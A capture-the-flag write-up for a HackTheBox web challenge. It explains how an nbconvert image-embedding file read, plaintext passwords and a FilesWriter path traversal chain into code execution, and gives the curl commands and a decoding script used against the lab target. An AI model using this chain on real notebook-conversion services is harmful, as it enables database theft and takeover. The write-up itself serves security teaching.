---
title: "Notebook Converter Pro - HTB Web Challenge"
date: 2026-05-14 12:00:00 +0000
categories: [CTF, HackTheBox]
tags: [web, path-traversal, rce, python, htb]
image:
  path: /assets/img/posts/notebook/banner.png
---

I don't usually write writeups mid-coffee. But this one earned it.

Notebook Converter Pro is a HackTheBox web challenge that looks, at first glance, 
like a boring internal tool. You register, upload a Jupyter notebook, pick a format, 
and download the converted output. Clean UI. Nothing screaming "hack me." 
That's exactly what makes it interesting.

Four bugs chained together — no exploit frameworks, just Burp Suite, 
a Python script, and patience.

---

## First Impressions

![App Login Page](/assets/img/posts/notebook/login.png)

Register, log in, upload a `.ipynb` file, choose HTML or Markdown, 
get your converted output back as a download.

![Dashboard](/assets/img/posts/notebook/dashboard.png)

Source code came with the challenge. I always read source before touching Burp.

app/
├── converter/
│   └── convert_job.py
├── routes/
│   ├── admin.py
│   ├── dashboard.py
│   └── public.py
├── services/
│   └── conversions.py
├── templates/
├── auth.py
├── db.py
├── factory.py
└── settings.py

Also at the root: `readflag.c` — a SUID binary that reads `/root/flag.txt`.

---

## Bug 1 — Arbitrary File Read via embed_images

```python
def convert_html(input_path, output_dir):
    exporter = nbconvert.HTMLExporter()
    exporter.embed_images = True
    body, _resources = exporter.from_filename(str(input_path))
```

`embed_images = True` tells nbconvert to read every image referenced 
in the notebook from disk and base64-encode it inline into the HTML. 
Zero sanitization. If your notebook references `../../../../data/app.db`, 
nbconvert reads the database and embeds it in the output.

---

## Bug 2 — Plaintext Password Storage

```python
admin_password = secrets.token_urlsafe(14)
conn.execute(
    "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
    ("admin", admin_password, "admin"),
)
```

Randomly generated — good. Stored as plaintext — very bad.

---

## Bug 3 — Admin-Gated Asset Storage

```python
def determine_storage_mode(output_format):
    if output_format == "markdown":
        return "saved_assets" if setting_enabled("asset_storage_enabled") 
               else "single_file"
    return "single_file"
```

`saved_assets` activates `FilesWriter` — locked behind admin privilege 
for a reason.

---

## Bug 4 — FilesWriter Path Traversal → RCE

`FilesWriter` joins `build_directory + attachment_key` with zero path 
traversal check. An attachment named 
`../../../../app/converter/convert_job.py` overwrites the actual 
converter script. We control what runs on every future conversion.

---

## The Attack

### Step 1 — Steal the Database

![Steal notebook craft](/assets/img/posts/notebook/steal.png)

```bash
curl -X POST http://TARGET/convert \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html" \
  -o /tmp/r.html
```

![Curl response](/assets/img/posts/notebook/curl1.png)

Extract and decode:

```python
import re, base64
content = open('/tmp/db_out.html', 'rb').read().decode('utf-8', errors='replace')
matches = re.findall(r'data:[^;]*;base64,([A-Za-z0-9+/=]+)', content)
for m in matches:
    data = base64.b64decode(m)
    if data[:6] == b'SQLite':
        open('/tmp/stolen.db', 'wb').write(data)
```

![SQLite credentials](/assets/img/posts/notebook/sqlite.png)

Admin password. Plaintext.

---

### Step 2 — Enable Asset Storage

![Enable asset storage](/assets/img/posts/notebook/admin.png)

```bash
curl -X POST http://TARGET/admin \
  -c /tmp/admin.txt -b /tmp/admin.txt \
  -d "asset_storage_enabled=on"
```

FilesWriter is now armed.

---

### Step 3 — Overwrite the Converter

![Path traversal upload](/assets/img/posts/notebook/pwn.png)

```bash
curl -X POST http://TARGET/convert \
  -c /tmp/admin.txt -b /tmp/admin.txt \
  -F "notebook=@/tmp/pwn.ipynb" \
  -F "format=markdown"
```

The converter is now ours.

---

### Step 4 — Get the Flag

![Flag captured](/assets/img/posts/notebook/flag.png)

```bash
grep -o 'HTB{.*}' /tmp/flag.html
```

Flag captured. 🎉

---

## Summary

| Bug | Description | Impact |
|-----|-------------|--------|
| 1 | `embed_images=True` no path check | Arbitrary file read |
| 2 | Plaintext password storage | Admin takeover |
| 3 | Admin-gated FilesWriter | Privilege escalation |
| 4 | FilesWriter path traversal | RCE |
